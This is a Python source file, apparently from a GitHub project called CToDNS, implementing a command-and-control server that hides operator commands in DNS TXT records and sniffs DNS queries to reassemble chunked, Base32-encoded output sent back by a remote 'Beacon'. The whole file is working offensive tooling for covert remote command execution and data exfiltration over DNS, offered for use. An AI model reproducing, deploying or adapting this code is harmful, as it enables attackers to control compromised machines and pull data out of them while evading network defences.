import subprocess
import base64
import base64 as base32
from scapy.all import sniff, DNS
from termcolor import colored

DNS_SERVER = "X.X.X.X"
DOMAIN = "Yout_DomainName.co.il"

def print_banner():
    banner = """
  ____ _____     ____  _   _ ____
 / ___|_   _|__ |  _ \\| \\ | / ___|
| |     | |/ _ \\| | | |  \\| \\___ \\
| |___  | | (_) | |_| | |\\  |___) |
 \\____| |_|\\___/|____/|_| \\_|____/
"""
    print(colored(banner, "cyan", attrs=["bold"]))
    print(colored("By ShkudW", "yellow", attrs=["bold"]))
    print(colored("https://github.com/ShkudW/CToDNS", "yellow", attrs=["bold"]))
    print("\n")

def update_txt_record(encoded_command):
    """
    Update a TXT record dynamically using nsupdate.
    """
    nsupdate_cmds = f"""
server {DNS_SERVER}
update delete {DOMAIN} TXT
update add {DOMAIN} 60 TXT "{encoded_command}"
send
"""
    try:
        subprocess.run(
            ["nsupdate"], input=nsupdate_cmds, text=True, capture_output=True, check=True
        )
    except subprocess.CalledProcessError as e:
        log(f"Failed to update TXT record: {e.stderr}", "ERROR")

def sync_bind():
    """
    Synchronize BIND server to write updates to the zone file.
    """
    try:
        subprocess.run(["rndc", "sync"], check=True)
    except subprocess.CalledProcessError as e:
        log(f"Failed to synchronize BIND: {e.stderr}", "ERROR")

def log(message, level="INFO"):
    """
    Log messages to the console.
    """
    if level == "INFO":
        print(message)
    elif level == "ERROR":
        print(colored(f"ERROR: {message}", "red"))

def decode_base32(data):
    """
    Decode Base32 data to string, fixing padding issues.
    """
    try:
        
        padding = len(data) % 8
        if padding != 0:
            data += "=" * (8 - padding)
        return base64.b32decode(data).decode()
    except Exception as e:
        log(f"Failed to decode Base32 data: {e}", "ERROR")
        return None

def listen_for_dns_packets():
    chunks = {}
    unique_id = None
    expected_chunks = 0

    while True:
        packet = sniff(filter="udp port 53", count=1, timeout=60)[0]
        if packet and packet.haslayer(DNS) and packet[DNS].qd:
            query_name = packet[DNS].qd.qname.decode()

            if "start" in query_name:
                unique_id = query_name.split("-")[0]
                chunks.clear()
                expected_chunks = 0
            elif "chunks" in query_name:
                try:
                    unique_id, chunk_count = query_name.split("-")[0], query_name.split("-")[1]
                    expected_chunks = int(chunk_count.replace("chunks", ""))
                except ValueError:
                    pass
            elif "chunk" in query_name:
                try:
                    unique_id, chunk_part = query_name.split("-")[0], query_name.split("-")[1]
                    chunk_index = int(chunk_part.replace("chunk", ""))
                    chunk_data = query_name.split("-")[2].split(".")[0]
                    chunks[chunk_index] = chunk_data
                except Exception:
                    pass
            elif "end" in query_name:
                if len(chunks) == expected_chunks:
                    try:
                        sorted_chunks = [chunks[i] for i in sorted(chunks.keys())]
                        full_data = "".join(sorted_chunks)
                        decoded_output = decode_base32(full_data)
                        if decoded_output:
                            cleaned_output = decoded_output.split("|", 1)[-1].strip()
                            print(colored(f"\nDecoded output from Beacon:\n{cleaned_output}\n", "green", attrs=["bold"]))
                        break  
                    except Exception as e:
                        log(f"Error decoding or assembling chunks: {e}", "ERROR")
                        break  
                else:
                    log(f"Incomplete chunks received. Expected {expected_chunks}, got {len(chunks)}.", "ERROR")
                    break  


if __name__ == "__main__":
    print_banner()
    log(colored("C2 Server Started. Type 'exit' to quit.", "yellow", attrs=["bold"]))
    while True:
        try:
            command = input("\nEnter command to execute: ")
            if command.lower() == "exit":
                log(colored("Exiting C2 Server.", "yellow", attrs=["bold"]))
                break

            encoded_command = base64.b64encode(command.encode()).decode()
            update_txt_record(encoded_command)
            sync_bind()

            listen_for_dns_packets() 
        except KeyboardInterrupt:
            log(colored("\nExiting C2 Server.", "yellow", attrs=["bold"]))
            break
